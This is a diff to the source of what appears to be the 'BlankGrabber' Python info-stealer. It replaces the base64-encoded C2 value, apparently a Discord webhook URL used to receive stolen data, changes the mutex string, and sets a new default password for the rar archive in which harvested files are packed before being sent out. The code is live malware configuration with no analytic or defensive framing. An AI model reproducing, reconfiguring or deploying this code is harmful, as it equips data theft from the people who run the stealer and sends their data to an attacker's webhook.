@@ -21,8 +21,8 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NTIyNDkyNzU2MTEyNjAwMC9yTk00YnZCMDJXSUpRNTVPWmh3d3JTc0M0ZW14VkFpcFFBV2poMFFJSEtBbUZqbzZKQnJ0MHM4VkpwZHZQNk9WT2NQNg==').decode())
-    Mutex = base64.b64decode('MGFteXFROExtWGxEbktCQw==').decode()
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NTIyNDkzMDU3Njk2MTY1OS90UC15Zm1tSDRmeDljOU80UWRNaHFZRkxwdGY1ODUtN2NzazUxeHc0bEVWblcxdUVLTUJ1S05ycEFzZnI4a2JCczFrbw==').decode())
+    Mutex = base64.b64decode('WFFaSVYwZk93S0xHZmlHaw==').decode()
     PingMe = bool('true')
     Vmprotect = bool('')
     Startup = bool('')
@@ -1267,7 +1267,7 @@ class BlankGrabber:
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, 'rar.exe')
             if os.path.isfile(rarPath):
-                password = Settings.ArchivePassword or '123'
+                password = Settings.ArchivePassword or 'blank123'
                 process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output=True, shell=True, cwd=self.TempFolder)
                 if process.returncode == 0:
                     return 'rar'
